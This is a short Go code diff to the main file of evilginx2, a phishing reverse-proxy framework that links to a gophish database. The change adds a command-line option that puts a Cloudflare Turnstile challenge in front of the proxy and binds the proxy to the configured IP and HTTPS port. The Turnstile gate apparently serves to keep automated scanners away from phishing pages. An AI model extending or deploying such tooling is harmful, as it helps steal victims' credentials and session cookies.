@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"strings"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
@@ -26,6 +27,7 @@ var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
 var gophish_db = flag.String("g", "", "Full path to gophish database")
 var feed_enabled = flag.Bool("feed", false, "Enable live feed")
+var turnstile = flag.String("turnstile", "", "Turnstile public/private key separated by \":\"")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -182,7 +184,17 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled)
+	var hp *core.HttpProxy
+
+	if *turnstile != "" {
+		turnstileParts := strings.Split(*turnstile, ":")
+		hs, _ := core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
+		hs.Start(hp)
+	} else {
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
+	}
+
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
